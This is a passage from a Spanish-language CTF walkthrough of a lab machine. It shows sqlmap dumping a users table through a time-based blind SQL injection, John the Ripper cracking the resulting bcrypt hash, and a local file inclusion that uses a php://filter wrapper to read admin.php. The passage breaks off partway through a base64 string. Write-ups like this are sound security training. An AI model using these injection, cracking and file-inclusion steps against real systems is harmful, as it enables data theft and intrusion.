</span></span></span><span class=line><span class=cl><span class=s1>[15:54:50] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
</span></span></span><span class=line><span class=cl><span class=s1>[15:54:50] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
</span></span></span><span class=line><span class=cl><span class=s1>do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#39;</span>--time-sec<span class=s1>&#39;)? [Y/n] Y
</span></span></span><span class=line><span class=cl><span class=s1>[15:55:06] [INFO] adjusting time delay to 1 second due to good response times
</span></span></span><span class=line><span class=cl><span class=s1>3
</span></span></span><span class=line><span class=cl><span class=s1>[15:55:06] [INFO] retrieved: id
</span></span></span><span class=line><span class=cl><span class=s1>[15:55:12] [INFO] retrieved: int(11)
</span></span></span><span class=line><span class=cl><span class=s1>[15:55:37] [INFO] retrieved: username
</span></span></span><span class=line><span class=cl><span class=s1>[15:55:59] [INFO] retrieved: varchar(50)
</span></span></span><span class=line><span class=cl><span class=s1>[15:56:32] [INFO] retrieved: password
</span></span></span><span class=line><span class=cl><span class=s1>[15:56:59] [INFO] retrieved: varchar(320)
</span></span></span><span class=line><span class=cl><span class=s1>Database: hillvalley
</span></span></span><span class=line><span class=cl><span class=s1>Table: users
</span></span></span><span class=line><span class=cl><span class=s1>[3 columns]
</span></span></span><span class=line><span class=cl><span class=s1>+----------+--------------+
</span></span></span><span class=line><span class=cl><span class=s1>| Column   | Type         |
</span></span></span><span class=line><span class=cl><span class=s1>+----------+--------------+
</span></span></span><span class=line><span class=cl><span class=s1>| id       | int(11)      |
</span></span></span><span class=line><span class=cl><span class=s1>| password | varchar(320) |
</span></span></span><span class=line><span class=cl><span class=s1>| username | varchar(50)  |
</span></span></span><span class=line><span class=cl><span class=s1>+----------+--------------+
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[15:57:34] [INFO] fetched data logged to text files under &#39;</span>/home/pylon/.local/share/sqlmap/output/hillvalley.thl<span class=err>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ending @ 15:57:34 /2025-07-20/</span></span></code></pre></div></figure></div><div class="callout callout-caution d-flex flex-row mt-4 mb-4 pt-4 pe-4 pb-2 ps-3"><svg class="outline/alert-triangle svg-inline callout-icon me-2 mb-3" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 9v4"/><path d="M10.363 3.591 2.257 17.125a1.914 1.914.0 001.636 2.871h16.214a1.914 1.914.0 001.636-2.87L13.637 3.59a1.914 1.914.0 00-3.274.0z"/><path d="M12 16h.01"/></svg><div class=callout-content><div class=callout-title><p>Aviso</p></div><div class=callout-body><p>Puede tardar un rato. La paciencia da el resultado, jeje.</p></div></div></div><p>Ya tenemos las columnas, vamos a dumpearnos los datos:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/…/pylon/THL/BackToTheFuture/nmap<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ sqlmap -u <span class=s2>&#34;http://hillvalley.thl/&#34;</span> --data<span class=o>=</span><span class=s2>&#34;username=test&amp;password=test&#34;</span> -D <span class=s2>&#34;hillvalley&#34;</span> -T <span class=s2>&#34;users&#34;</span> -C <span class=s2>&#34;username, password&#34;</span> --dump --batch
</span></span><span class=line><span class=cl>        ___
</span></span><span class=line><span class=cl>       __H__
</span></span><span class=line><span class=cl> ___ ___<span class=o>[)]</span>_____ ___ ___  <span class=o>{</span>1.9.6#stable<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ -<span class=p>|</span> . <span class=o>[(]</span>     <span class=p>|</span> .<span class=s1>&#39;| . |
</span></span></span><span class=line><span class=cl><span class=s1>|___|_  [,]_|_|_|__,|  _|
</span></span></span><span class=line><span class=cl><span class=s1>      |_|V...       |_|   https://sqlmap.org
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class=k>for</span> any misuse or damage caused by this program
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> starting @ 15:59:21 /2025-07-20/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>15:59:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> resuming back-end DBMS <span class=s1>&#39;mysql&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>15:59:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> testing connection to the target URL
</span></span><span class=line><span class=cl><span class=o>[</span>15:59:21<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> potential permission problems detected <span class=o>(</span><span class=s1>&#39;Access denied&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>you have not declared cookie<span class=o>(</span>s<span class=o>)</span>, <span class=k>while</span> server wants to <span class=nb>set</span> its own <span class=o>(</span><span class=s1>&#39;PHPSESSID=4e1k1f9625g...7iff656cko&#39;</span><span class=o>)</span>. Do you want to use those <span class=o>[</span>Y/n<span class=o>]</span> Y
</span></span><span class=line><span class=cl>sqlmap resumed the following injection point<span class=o>(</span>s<span class=o>)</span> from stored session:
</span></span><span class=line><span class=cl>---
</span></span><span class=line><span class=cl>Parameter: username <span class=o>(</span>POST<span class=o>)</span>
</span></span><span class=line><span class=cl>    Type: time-based blind
</span></span><span class=line><span class=cl>    Title: MySQL &gt;<span class=o>=</span> 5.0.12 AND time-based blind <span class=o>(</span>query SLEEP<span class=o>)</span>
</span></span><span class=line><span class=cl>    Payload: <span class=nv>username</span><span class=o>=</span>test<span class=s1>&#39; AND (SELECT 9578 FROM (SELECT(SLEEP(5)))ctfH) AND &#39;</span>YLkb<span class=s1>&#39;=&#39;</span>YLkb<span class=p>&amp;</span><span class=nv>password</span><span class=o>=</span><span class=nb>test</span>
</span></span><span class=line><span class=cl>---
</span></span><span class=line><span class=cl><span class=o>[</span>15:59:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> the back-end DBMS is MySQL
</span></span><span class=line><span class=cl>web server operating system: Linux Debian
</span></span><span class=line><span class=cl>web application technology: PHP, Apache 2.4.62
</span></span><span class=line><span class=cl>back-end DBMS: MySQL &gt;<span class=o>=</span> 5.0.12 <span class=o>(</span>MariaDB fork<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>15:59:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> fetching entries of column<span class=o>(</span>s<span class=o>)</span> <span class=s1>&#39;password,username&#39;</span> <span class=k>for</span> table <span class=s1>&#39;users&#39;</span> in database <span class=s1>&#39;hillvalley&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>15:59:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> fetching number of column<span class=o>(</span>s<span class=o>)</span> <span class=s1>&#39;password,username&#39;</span> entries <span class=k>for</span> table <span class=s1>&#39;users&#39;</span> in database <span class=s1>&#39;hillvalley&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>15:59:21<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> resumed: <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=o>[</span>15:59:21<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> <span class=o>(</span><span class=k>case</span><span class=o>)</span> time-based comparison requires larger statistical model, please wait.............................. <span class=o>(</span><span class=k>done</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>15:59:21<span class=o>]</span> <span class=o>[</span>WARNING<span class=o>]</span> it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
</span></span><span class=line><span class=cl><span class=k>do</span> you want sqlmap to try to optimize value<span class=o>(</span>s<span class=o>)</span> <span class=k>for</span> DBMS delay responses <span class=o>(</span>option <span class=s1>&#39;--time-sec&#39;</span><span class=o>)</span>? <span class=o>[</span>Y/n<span class=o>]</span> Y
</span></span><span class=line><span class=cl><span class=o>[</span>15:59:36<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> adjusting <span class=nb>time</span> delay to <span class=m>1</span> second due to good response <span class=nb>times</span>
</span></span><span class=line><span class=cl><span class=nv>$2</span>y<span class=nv>$10</span>$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy
</span></span><span class=line><span class=cl><span class=o>[</span>16:03:28<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> retrieved: marty
</span></span><span class=line><span class=cl>Database: hillvalley
</span></span><span class=line><span class=cl>Table: users
</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>1</span> entry<span class=o>]</span>
</span></span><span class=line><span class=cl>+----------+--------------------------------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> username <span class=p>|</span> password                                                     <span class=p>|</span>
</span></span><span class=line><span class=cl>+----------+--------------------------------------------------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> marty    <span class=p>|</span> <span class=nv>$2</span>y<span class=nv>$10</span>$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy <span class=p>|</span>
</span></span><span class=line><span class=cl>+----------+--------------------------------------------------------------+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>16:03:43<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> table <span class=s1>&#39;hillvalley.users&#39;</span> dumped to CSV file <span class=s1>&#39;/home/pylon/.local/share/sqlmap/output/hillvalley.thl/dump/hillvalley/users.csv&#39;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>16:03:43<span class=o>]</span> <span class=o>[</span>INFO<span class=o>]</span> fetched data logged to text files under <span class=s1>&#39;/home/pylon/.local/share/sqlmap/output/hillvalley.thl&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ending @ 16:03:43 /2025-07-20/</span></span></code></pre></div></figure></div><p>Tenemos su hash, vamos a emplear <code>john</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/Desktop/pylon/THL/BackToTheFuture<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ john -w<span class=o>=</span>/usr/share/wordlists/rockyou.txt <span class=nb>hash</span>
</span></span><span class=line><span class=cl>Using default input encoding: UTF-8
</span></span><span class=line><span class=cl>Loaded <span class=m>1</span> password <span class=nb>hash</span> <span class=o>(</span>bcrypt <span class=o>[</span>Blowfish 32/64 X3<span class=o>])</span>
</span></span><span class=line><span class=cl>Cost <span class=m>1</span> <span class=o>(</span>iteration count<span class=o>)</span> is <span class=m>1024</span> <span class=k>for</span> all loaded hashes
</span></span><span class=line><span class=cl>Will run <span class=m>4</span> OpenMP threads
</span></span><span class=line><span class=cl>Press <span class=s1>&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class=k>for</span> status
</span></span><span class=line><span class=cl>andromeda        <span class=o>(</span>?<span class=o>)</span>
</span></span><span class=line><span class=cl>1g 0:00:00:14 DONE <span class=o>(</span>2025-07-20 16:07<span class=o>)</span> 0.06978g/s 261.2p/s 261.2c/s 261.2C/s benji..street
</span></span><span class=line><span class=cl>Use the <span class=s2>&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span class=line><span class=cl>Session completed.</span></span></code></pre></div></figure></div><p>Bien!! Ya tenemos la contraseña del usuario <code>marty</code>. Vamos a probarlas en el login:</p><figure><img srcset=data:image/webp;base64,UklGRi4AAABXRUJQVlA4ICIAAACQAQCdASoQAAQAAph8J6QAAudZtgAA/uRp7WHIHDoUAAAA data-srcset="/images/thl/backtothefuture/7_hueccbad04f66c0c7f4208db78631eb8a9_35121_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/backtothefuture/7_hueccbad04f66c0c7f4208db78631eb8a9_35121_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/backtothefuture/7_hueccbad04f66c0c7f4208db78631eb8a9_35121_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/backtothefuture/7_hueccbad04f66c0c7f4208db78631eb8a9_35121_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/thl/backtothefuture/7_hueccbad04f66c0c7f4208db78631eb8a9_35121_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/thl/backtothefuture/7_hueccbad04f66c0c7f4208db78631eb8a9_35121_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/thl/backtothefuture/7_hueccbad04f66c0c7f4208db78631eb8a9_35121_1917x0_resize_q85_h2_lanczos_3.webp 1917w" data-sizes=auto src=/images/thl/backtothefuture/7_hueccbad04f66c0c7f4208db78631eb8a9_35121_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1917 height=537 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Moviendome por la aplicación web me percato de lo siguiente:</p><figure><img srcset="data:image/webp;base64,UklGRiwAAABXRUJQVlA4ICAAAACQAQCdASoQAAIAAph8J6QAAudFuiAA/tXnl8DFSgAAAA==" data-srcset="/images/thl/backtothefuture/8_hu033aaf0817cdb2575200a0bd0f3e06bd_5007_406x0_resize_q85_h2_lanczos_3.webp 406w" data-sizes=auto src=/images/thl/backtothefuture/8_hu033aaf0817cdb2575200a0bd0f3e06bd_5007_406x0_resize_q85_bgffffff_lanczos_3.jpg width=406 height=54 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Esto huele a un posible <a href=https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion>LFI</a> vamos a probar poniendo simplemente <code>/etc/passwd</code>:</p><figure><img srcset="data:image/webp;base64,UklGRjIAAABXRUJQVlA4ICYAAACwAQCdASoQAAUAAph8J5wAAudYwlYAAP7a1Sma9WpQuAjxvFwAAA==" data-srcset="/images/thl/backtothefuture/9_hu09c6969408d0cb0fe62f396dbe965c40_164580_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/backtothefuture/9_hu09c6969408d0cb0fe62f396dbe965c40_164580_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/backtothefuture/9_hu09c6969408d0cb0fe62f396dbe965c40_164580_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/backtothefuture/9_hu09c6969408d0cb0fe62f396dbe965c40_164580_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/thl/backtothefuture/9_hu09c6969408d0cb0fe62f396dbe965c40_164580_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/thl/backtothefuture/9_hu09c6969408d0cb0fe62f396dbe965c40_164580_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/thl/backtothefuture/9_hu09c6969408d0cb0fe62f396dbe965c40_164580_1821x0_resize_q85_h2_lanczos_3.webp 1821w" data-sizes=auto src=/images/thl/backtothefuture/9_hu09c6969408d0cb0fe62f396dbe965c40_164580_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1821 height=541 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vamos a ver si podemos usar <code>PHP Wrappers</code>:</p><nav><div class="nav nav-tabs" id=nav-tab role=tablist><button data-toggle-tab=payload class="nav-link active" id=tabs-create-new-site-0-tab data-bs-toggle=tab data-bs-target=#tabs-create-new-site-0 type=button role=tab aria-controls=tabs-create-new-site-0 aria-selected=true>
Payload</button></div></nav><div class=tab-content id=nav-tabContent><div data-pane=payload class="tab-pane fade show active" id=tabs-create-new-site-0 role=tabpanel aria-labelledby=tabs-create-new-site-0-tab tabindex=0><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><pre tabindex=0><code>php://filter/convert.base64-encode/resource=admin.php</code></pre></figure></div></div></div><figure><img srcset="data:image/webp;base64,UklGRjAAAABXRUJQVlA4ICQAAACQAQCdASoQAAMAAph8J5wAAudZuFQA/uldpuKABVnQaWYAAAA=" data-srcset="/images/thl/backtothefuture/10_huf6bb5633a54a306ee7cb37a7f6cced9b_46035_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/backtothefuture/10_huf6bb5633a54a306ee7cb37a7f6cced9b_46035_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/backtothefuture/10_huf6bb5633a54a306ee7cb37a7f6cced9b_46035_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/backtothefuture/10_huf6bb5633a54a306ee7cb37a7f6cced9b_46035_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/thl/backtothefuture/10_huf6bb5633a54a306ee7cb37a7f6cced9b_46035_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/thl/backtothefuture/10_huf6bb5633a54a306ee7cb37a7f6cced9b_46035_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/thl/backtothefuture/10_huf6bb5633a54a306ee7cb37a7f6cced9b_46035_1801x0_resize_q85_h2_lanczos_3.webp 1801w" data-sizes=auto src=/images/thl/backtothefuture/10_huf6bb5633a54a306ee7cb37a7f6cced9b_46035_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1801 height=292 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vemos que pudimos emplearlo, vamos a descodificar la cadena <em>base64</em>:</p><nav><div class="nav nav-tabs" id=nav-tab role=tablist><button data-toggle-tab="cadena base64" class="nav-link active" id=tabs--0-tab data-bs-toggle=tab data-bs-target=#tabs--0 type=button role=tab aria-controls=tabs--0 aria-selected=true>
Cadena base64</button>
<button data-toggle-tab=admin.php class=nav-link id=tabs--1-tab data-bs-toggle=tab data-bs-target=#tabs--1 type=button role=tab aria-controls=tabs--1 aria-selected=true>
admin.php</button></div></nav><div class=tab-content id=nav-tabContent><div data-pane="cadena base64" class="tab-pane fade show active" id=tabs--0 role=tabpanel aria-labelledby=tabs--0-tab tabindex=0><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><pre tabindex=0><code> PD9waHANCmluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQppZiAoIWlzc2V0KCRfU0VTU0lPTlsnbG9nZ2VkX2luJ10pIHx8ICRfU0VTU0lPTlsnbG9nZ2VkX2luJ10gIT09IHRydWUpIHsNCiAgICBoZWFkZXIoIkxvY2F0aW9uOiBpbmRleC5waHAiKTsNCiAgICBleGl0Ow0KfQ0KPz4NCg0KPCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQogICAgDQogICAgPCEtLSBTZSBkaWNlIHF1ZSBlbCBEZUxvcmVhbiBndWFyZGEgc2VjcmV0b3Mgc2kgaW5zcGVjY2lvbsOhcyBiaWVuIC0tPg0KICAgIDx0aXRsZT5IaWxsIFZhbGxleSBBZG1pbiBQYW5lbDwvdGl0bGU+DQogICAgPHN0eWxlPg0KICAgICAgICBib2R5IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMwZTBlMWE7DQogICAgICAgICAgICBjb2xvcjogIzAwZmZjYzsNCiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiAnQ291cmllciBOZXcnLCBDb3VyaWVyLCBtb25vc3BhY2U7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGgyIHsNCiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDFyZW07DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHAgew0KICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogLjVyZW07DQogICAgICAgIH0NCg0KICAgICAgICAuY29udGFpbmVyIHsNCiAgICAgICAgICAgIHdpZHRoOiA5MCU7DQogICAgICAgICAgICBtYXJnaW46IDJyZW0gYXV0bzsNCiAgICAgICAgfQ0KDQogICAgICAgIC5uYXYgew0KICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMS41cmVtOw0KICAgICAgICAgICAgZGlzcGxheTogZmxleDsNCiAgICAgICAgfQ0KICAgICAgICAubmF2IGEgew0KICAgICAgICAgICAgY29sb3I6ICMwMGZmZmY7DQogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7DQogICAgICAgICAgICBtYXJnaW4tcmlnaHQ6IDFyZW07DQogICAgICAgICAgICBwYWRkaW5nOiAuNXJlbSAwOw0KICAgICAgICAgICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICMwMGZmZmY7DQogICAgICAgIH0NCg0KICAgICAgICAudGVybWluYWwgew0KICAgICAgICAgICAgYmFja2dyb3VuZDogIzAwMDAwMDsNCiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICMwMGZmY2M7DQogICAgICAgICAgICBwYWRkaW5nOiAxcmVtOw0KICAgICAgICAgICAgdGV4dC13cmFwOiB3cmFwOw0KICAgICAgICAgICAgd29yZC13cmFwOiB3cmFwOw0KICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbjsNCiAgICAgICAgICAgIG92ZXJmbG93LXdyYXA6IGJyZWFrLXdvcmQ7DQogICAgICAgICAgICBkaXNwbGF5OiBmbGV4Ow0KICAgICAgICAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOw0KICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsNCiAgICAgICAgfQ0KDQogICAgICAgIC5pbWcgew0KICAgICAgICAgICAgd2lkdGg6IDEwMCU7DQogICAgICAgICAgICBtYXgtd2lkdGg6IDUwMHB4Ow0KICAgICAgICAgICAgZGlzcGxheTogYmxvY2s7DQogICAgICAgICAgICBtYXJnaW46IDAgYXV0bzsNCiAgICAgICAgfQ0KDQogICAgICAgIEBtZWRpYSAobWF4LXdpZHRoOiA3NjhweCkgew0KICAgICAgICAgICAgLnRpbWUtcm93IHsNCiAgICAgICAgICAgICAgICBncmlkLXRlbXBsYXRlLWNvbHVtbnM6IHJlcGVhdCg2LCBhdXRvKTsNCiAgICAgICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLnRpbWUtcm93IC5jYXB0aW9uIHsNCiAgICAgICAgICAgICAgICBmb250LXNpemU6IDAuOXJlbTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLmNoYXIgew0KICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMS4zcmVtOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBoMSB7DQogICAgICAgICAgICAgICAgZm9udC1zaXplOiAycmVtOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuZGVsb3JlYW4tcGFuZWwgew0KICAgICAgICAgICAgICAgIHBhZGRpbmc6IDFyZW07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAuZmx1eC1jYXJkIHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMxMTE7DQogICAgICAgICAgICBtYXgtd2lkdGg6IDcwMHB4Ow0KICAgICAgICAgICAgbWFyZ2luOiBhdXRvOw0KICAgICAgICAgICAgcGFkZGluZzogMnJlbTsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDEycHg7DQogICAgICAgICAgICBib3gtc2hhZG93OiAwIDAgMjBweCAjMDBmN2ZmNTU7DQogICAgICAgICAgICBib3JkZXI6IDJweCBkYXNoZWQgI2ZiYmMwNTsNCiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXg7DQogICAgICAgICAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uOw0KICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7DQogICAgICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyOw0KICAgICAgICB9DQoNCiAgICAgICAgLmZsdXgtaW1nIHsNCiAgICAgICAgICAgIG1hcmdpbjogMXJlbSBhdXRvOw0KICAgICAgICB9DQoNCiAgICAgICAgLmZsdXgtaW1nIGltZyB7DQogICAgICAgICAgICBtYXgtd2lkdGg6IDEwMCU7DQogICAgICAgICAgICB3aWR0aDogMzAwcHg7DQogICAgICAgICAgICBmaWx0ZXI6IGRyb3Atc2hhZG93KDAgMCAxMHB4ICMwMGY3ZmYpOw0KICAgICAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuM3MgZWFzZTsNCiAgICAgICAgfQ0KDQogICAgICAgIC5mbHV4LWltZy5hY3RpdmUgaW1nIHsNCiAgICAgICAgICAgIGFuaW1hdGlvbjogcHVsc2UgMS4ycyBpbmZpbml0ZSBhbHRlcm5hdGU7DQogICAgICAgICAgICBmaWx0ZXI6IGRyb3Atc2hhZG93KDAgMCAyMHB4ICMwMGY3ZmYpOw0KICAgICAgICB9DQoNCiAgICAgICAgLmZsdXgtdGV4dCB7DQogICAgICAgICAgICBjb2xvcjogIzdDRkMwMDsNCiAgICAgICAgICAgIGZvbnQtc2l6ZTogMS4xcmVtOw0KICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDEuNjsNCiAgICAgICAgICAgIG1hcmdpbi10b3A6IDEuNXJlbTsNCiAgICAgICAgICAgIGFuaW1hdGlvbjogYXBwZWFyVGV4dCAxcyBlYXNlLWluLW91dDsNCiAgICAgICAgfQ0KDQogICAgICAgIC5zd2l0Y2ggew0KICAgICAgICAgICAgbWFyZ2luLXRvcDogMnJlbTsNCiAgICAgICAgICAgIGRpc3BsYXk6IGlubGluZS1ibG9jazsNCiAgICAgICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsNCiAgICAgICAgICAgIHdpZHRoOiA2MHB4Ow0KICAgICAgICAgICAgaGVpZ2h0OiAzNHB4Ow0KICAgICAgICB9DQoNCiAgICAgICAgLnN3aXRjaCBpbnB1dCB7DQogICAgICAgICAgICBvcGFjaXR5OiAwOw0KICAgICAgICAgICAgd2lkdGg6IDA7DQogICAgICAgICAgICBoZWlnaHQ6IDA7DQogICAgICAgIH0NCg0KICAgICAgICAuc2xpZGVyIHsNCiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCiAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlcjsNCiAgICAgICAgICAgIHRvcDogMDsNCiAgICAgICAgICAgIGxlZnQ6IDA7DQogICAgICAgICAgICByaWdodDogMDsNCiAgICAgICAgICAgIGJvdHRvbTogMDsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICM0NDQ7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiAzNHB4Ow0KICAgICAgICAgICAgdHJhbnNpdGlvbjogMC40czsNCiAgICAgICAgfQ0KDQogICAgICAgIC5zbGlkZXI6YmVmb3JlIHsNCiAgICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCiAgICAgICAgICAgIGNvbnRlbnQ6ICIiOw0KICAgICAgICAgICAgaGVpZ2h0OiAyNnB4Ow0KICAgICAgICAgICAgd2lkdGg6IDI2cHg7DQogICAgICAgICAgICBsZWZ0OiA0cHg7DQogICAgICAgICAgICBib3R0b206IDRweDsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNmNDQzMzY7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1MCU7DQogICAgICAgICAgICB0cmFuc2l0aW9uOiAwLjRzOw0KICAgICAgICB9DQoNCiAgICAgICAgLnN3aXRjaCBpbnB1dDpjaGVja2VkKy5zbGlkZXIgew0KICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzdDRkMwMDsNCiAgICAgICAgfQ0KDQogICAgICAgIC5zd2l0Y2ggaW5wdXQ6Y2hlY2tlZCsuc2xpZGVyOmJlZm9yZSB7DQogICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoMjZweCk7DQogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjN0NGQzAwOw0KICAgICAgICB9DQoNCiAgICAgICAgQGtleWZyYW1lcyBhcHBlYXJUZXh0IHsNCiAgICAgICAgICAgIGZyb20gew0KICAgICAgICAgICAgICAgIG9wYWNpdHk6IDA7DQogICAgICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDEwcHgpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICB0byB7DQogICAgICAgICAgICAgICAgb3BhY2l0eTogMTsNCiAgICAgICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBAa2V5ZnJhbWVzIHB1bHNlIHsNCiAgICAgICAgICAgIGZyb20gew0KICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogc2NhbGUoMSk7DQogICAgICAgICAgICAgICAgZmlsdGVyOiBkcm9wLXNoYWRvdygwIDAgNXB4ICMwMGY3ZmYpOw0KICAgICAgI